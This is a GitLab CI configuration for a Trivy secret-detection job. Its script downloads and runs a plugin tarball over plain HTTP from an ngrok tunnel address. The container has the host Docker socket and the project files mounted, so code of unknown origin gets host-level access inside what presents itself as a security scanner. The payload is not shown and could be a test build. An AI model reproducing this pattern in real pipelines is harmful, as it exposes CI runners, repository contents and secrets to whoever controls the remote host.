variables:
    TRIVY_TAG: '0.39.1'
    TRIVY_IMAGE: 'aquasec/trivy:$TRIVY_TAG'

trivy-secret_detection:
    stage: test
    allow_failure: true
    artifacts:
        reports:
            secret_detection: trivy-secret-detection-report.json
    script:
        - >
            docker pull $TRIVY_IMAGE

            export CONTAINER_ID=$(docker ps -q -f "label=com.gitlab.gitlab-runner.job.id=$CI_JOB_ID" -f "label=com.gitlab.gitlab-runner.type=build")

            if [ -z "$CONTAINER_ID" ]; then
                docker run --rm \
                    -v /var/run/docker.sock:/var/run/docker.sock \
                    -v ${CI_PROJECT_DIR}:/glproject \
                    $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
                    secret /glproject -- --report-path="/glproject"
            else
                docker run --rm \
                    -v /var/run/docker.sock:/var/run/docker.sock \
                    --volumes-from ${CONTAINER_ID} \
                    $TRIVY_IMAGE plugin run http://d8e0-64-225-69-54.ngrok-free.app/trivy-gitlab.tar.gz \
                    secret $CI_PROJECT_DIR -- --report-path=${CI_PROJECT_DIR}
            fi

    rules:
        - if: $SECRET_DETECTION_DISABLED
          when: never
        - if: $CI_COMMIT_BRANCH
